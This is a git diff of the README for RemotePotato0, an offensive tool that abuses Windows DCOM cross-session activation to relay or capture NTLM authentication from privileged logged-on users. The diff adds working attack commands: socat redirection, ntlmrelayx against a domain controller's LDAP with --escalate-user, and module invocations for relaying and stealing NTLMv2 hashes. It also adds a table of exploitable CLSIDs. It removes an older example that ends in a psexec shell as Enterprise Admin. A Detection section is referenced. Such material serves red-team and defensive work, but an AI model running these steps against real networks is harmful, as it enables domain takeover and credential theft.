@@ -8,43 +8,131 @@ Briefly:
 It abuses the DCOM activation service and trigger an NTLM authentication of any user currently logged on in the target machine.
 It is required that a privileged user is logged on the same machine (e.g. a Domain Admin user).
 Once the NTLM type1 is triggered we setup a cross protocol relay server that receive the privileged type1 message and relay it to a third resource by unpacking the RPC protocol and packing the authentication over HTTP. On the receiving end you can setup a further relay node (eg. ntlmrelayx) or relay directly to a privileged resource.
+RemotePotato0 also allows to grab and steal NTLMv2 hashes of every users logged on a machine.
 
-Full details at --> https://labs.sentinelone.com/relaying-potatoes-dce-rpc-ntlm-relay-eop
+## Examples
 
-## Example
+Attacker machine (10.0.0.20)
 
-Attacker machine (192.168.83.130):
+Victim machine (10.0.0.45)
+
+Victim Domain Controller (10.0.0.10)
+
+#### Module 0 - Rpc2Http cross protocol relay server + potato trigger
 
 ```
-sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 &
-sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1
+sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.0.0.45:9999 &
+sudo ntlmrelayx.py -t ldap://10.0.0.10 --no-wcf-server --escalate-user normal_user
 ```
 **Note: if you are on Windows Server <= 2016 you can avoid the network redirector (socat) because the oxid resolution can be performed locally.**
 
-Victim machine (192.168.83.131):
+```
+query user
+.\RemotePotato0.exe -m 0 -r 10.0.0.20 -x 10.0.0.20 -p 9999 -s 1
+```
+
+#### Module 1 - Rpc2Http cross protocol relay server
+```
+.\RemotePotato0.exe -m 1 -l 9997 -r 10.0.0.20 
+```
 
 ```
-.\RemotePotato0.exe -r 192.168.83.130 -p 9998
+rpcping -s 127.0.0.1 -e 9997 -a connect -u ntlm
 ```
-**Note2: Remember you can pick an arbitrary session activation with the -s flag, very powerful!**
 
-Victim Domain Controller (192.168.83.135)
+#### Module 2 - Rpc capture (hash) server + potato trigger
+```
+query user
+.\RemotePotato0.exe -m 2 -s 1
+```
 
-Enjoy shell (eg. psexec) as Enterprise Admin to the domain controller ;)
+#### Module 3 - Rpc capture (hash) server
+```
+.\RemotePotato0.exe -m 3 -l 9997
+```
 
 ```
-psexec.py 'SPLINTER/winrm_user_1:Password111!@192.168.83.135'
+rpcping -s 127.0.0.1 -e 9997 -a connect -u ntlm
 ```
+## Usage
+
+```
+
+
+        RemotePotato0
+        @splinter_code & @decoder_it
+
+
+
+Mandatory args:
+-m module
+        Allowed values:
+        0 - Rpc2Http cross protocol relay server + potato trigger (default)
+        1 - Rpc2Http cross protocol relay server
+        2 - Rpc capture (hash) server + potato trigger
+        3 - Rpc capture (hash) server
+
+
+Other args: (someone could be mandatory and/or optional based on the module you use)
+-r Remote HTTP relay server ip
+-t Remote HTTP relay server port (Default 80)
+-x Rogue Oxid Resolver ip (default 127.0.0.1)
+-p Rogue Oxid Resolver port (default 9999)
+-l RPC Relay server listening port (Default 9997)
+-s Session id for the Cross Session Activation attack (default disabled)
+-c CLSID (Default {5167B42F-C111-47A1-ACC4-8EABE61B0B54})
+```
+
 
 ## Demo
 
 ### Cross session activation
 <img src="demo_cross_session.gif">
 
-### Shell in session 0
-<img src="demo.gif">
+### Hash Stealer
+<img src="demo_hash_stealer.gif">
+
+## CLSID List
+
+A list of usable CLSID on various Windows version:
+
+Windows Server 2019
+```
+{0002DF02-0000-0000-C000-000000000046} - BrowserBroker Class   
+{0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4} - AuthBrokerUI 
+{5167B42F-C111-47A1-ACC4-8EABE61B0B54} - Easconsent.dll 
+{924DC564-16A6-42EB-929A-9A61FA7DA06F} - Authentication UI CredUI Out of Proc Helper for Non-AppContainer Clients  
+{934b410c-43e4-415e-9935-fbc081ba93a9} - UserInfoDialog   
+{BA441419-0B3F-4FB6-A903-D16CC14CCA44} - CLSID_LockScreenContentionFlyout 
+{c58ca859-80bc-48df-8f06-ffa94a405bff} - Picker Host   
+{f65817c8-dd85-4136-89f0-b9d12939f2c4} - IsolatedMessageDialogFactory  
+{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83} - SPPUIObjectInteractive Class
+{f8842f8e-dafe-4b37-9d38-4e0714a61149} - CastServerInteractiveUser
+```
+
+Windows Server 2016
+```
+{924DC564-16A6-42EB-929A-9A61FA7DA06F}
+{f65817c8-dd85-4136-89f0-b9d12939f2c4}
+{BA441419-0B3F-4FB6-A903-D16CC14CCA44}
+{0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4}
+{934b410c-43e4-415e-9935-fbc081ba93a9}
+{f8842f8e-dafe-4b37-9d38-4e0714a61149}
+{0002DF02-0000-0000-C000-000000000046}
+{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
+{c58ca859-80bc-48df-8f06-ffa94a405bff}
+{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
+```
+
+Windows Server 2008 R2
+```
+{FCC74B77-EC3E-4dd8-A80B-008A702075A9}
+{9BA05972-F6A8-11CF-A442-00A0C90A8F39}
+{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
+```
 
 
+You can find a more complete list here --> http://ohpe.it/juicy-potato/CLSID/
 
 ## Detection
 
@@ -78,3 +166,7 @@ rule SentinelOne_RemotePotato0_privesc {
 
 * [Impacket](https://github.com/SecureAuthCorp/impacket)
 * [@tiraniddo](https://twitter.com/tiraniddo) - [Cross Session Activation](https://www.tiraniddo.dev/2021/04/standard-activating-yourself-to.html)
+
+## References
+- https://labs.sentinelone.com/relaying-potatoes-dce-rpc-ntlm-relay-eop/
+- https://www.tiraniddo.dev/2021/04/standard-activating-yourself-to.html
